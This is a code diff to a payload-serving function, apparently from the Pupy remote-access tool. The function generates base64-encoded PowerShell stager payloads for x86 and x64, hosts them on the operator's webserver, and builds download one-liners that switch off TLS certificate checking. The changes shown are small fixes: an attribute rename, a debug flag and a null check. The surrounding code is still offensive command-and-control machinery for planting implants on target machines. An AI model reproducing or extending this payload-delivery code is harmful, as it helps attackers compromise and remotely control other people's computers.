@@ -16,7 +16,7 @@ def serve_ps1_payload(display, server, conf, link_ip=None, useTargetProxy=False,
         display(Error('Oneliners only supported from pupysh'))
         return
 
-    if not server.web_handlers_enabled:
+    if not server.web_handler_enabled:
         display(Error('Webserver disabled'))
         return
 
@@ -28,13 +28,15 @@ def serve_ps1_payload(display, server, conf, link_ip=None, useTargetProxy=False,
 
     payload_url_x86 = server.serve_content(
         stage_encoding.format(
-            b64encode(pupygen.generate_ps1(display, conf, x86=True, as_str=True))),
-        as_file=True, alias='ps1 payload [x86]')
+            b64encode(pupygen.generate_ps1(
+                display, conf, x86=True, as_str=True, debug=conf.get('debug', False)))),
+        alias='ps1 payload [x86]')
 
     payload_url_x64 = server.serve_content(
         stage_encoding.format(
-            b64encode(pupygen.generate_ps1(display, conf, x64=True, as_str=True))),
-        as_file=True, alias='ps1 payload [x64]')
+            b64encode(pupygen.generate_ps1(
+                display, conf, x64=True, as_str=True, debug=conf.get('debug', False)))),
+        alias='ps1 payload [x64]')
 
     protocol = 'http'
     ssl_cert_validation = ''
@@ -44,7 +46,7 @@ def serve_ps1_payload(display, server, conf, link_ip=None, useTargetProxy=False,
     if nothidden:
         hidden = ''
 
-    if server.pupweb.ssl:
+    if server.pupweb and server.pupweb.ssl:
         protocol = 'https'
         ssl_cert_validation = '[System.Net.ServicePointManager]::'\
           'ServerCertificateValidationCallback={$true};'
